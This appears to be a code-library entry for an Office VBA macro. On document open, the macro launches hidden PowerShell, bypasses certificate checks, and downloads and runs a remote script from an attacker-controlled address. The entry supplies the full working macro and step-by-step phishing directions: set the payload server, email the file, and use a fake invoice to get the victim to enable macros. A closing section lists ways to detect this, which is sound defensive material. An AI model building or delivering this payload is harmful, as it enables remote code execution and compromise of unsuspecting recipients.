---
id: ecd0eb3f-e36c-4ab4-ac30-4596d2eaca76
type: code
language: vba
verified: true
created_at: '2023-04-06T03:56:23.395355+00:00'
updated_at: '2023-04-10T20:36:56.290642+00:00'
tags:
  - macro
  - vba
  - powershell
  - download-execution
platforms:
  - Windows
validated: true
---

# Office-VBA-Macro-for-PowerShell-Download-Execution

## Code

```vba
Sub Execute()
Dim payload
payload = "powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('http://10.10.10.10:4242/exploit');"
Call Shell(payload, vbHide)
End Sub
Sub Document_Open()
Execute
End Sub
```

## Description

This VBA macro is embedded in a Microsoft Office DOCM file and automatically executes when the document is opened (after macros are enabled). It defines a payload string that launches a hidden PowerShell process to bypass SSL validation, use system proxy credentials, download a script from a remote URL using .NET WebClient, and invoke it with IEX (Invoke-Expression). This enables remote code execution without dropping files on disk, commonly used in phishing attacks for initial access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| URL in payload | Remote URL hosting the PowerShell script to download and execute | `http://10.10.10.10:4242/exploit` |

## Usage

Insert this code into the VBA editor of a new DOCM file (Alt + F11 in Word, paste into ThisDocument or a Module). Customize the URL to your payload server. Save as .docm, deliver via email, and wait for the victim to enable macros. Pair with a decoy document (e.g., fake invoice) to lure the user.

## Detection

- Enable VBA macro logging in Office (via Event Viewer or EDR) to capture execution of Subs like Document_Open.
- Monitor PowerShell events (Event ID 400-410) for hidden executions (-w hidden) or IEX usage.
- Network monitoring for unexpected downloads to attacker IPs or PowerShell-related user-agents.
- Antivirus/EDR signatures for common macro patterns or .NET WebClient invocations from Office processes.

## Related

- [[procedures/DOCM-Download-and-Execute-via-PowerShell]]
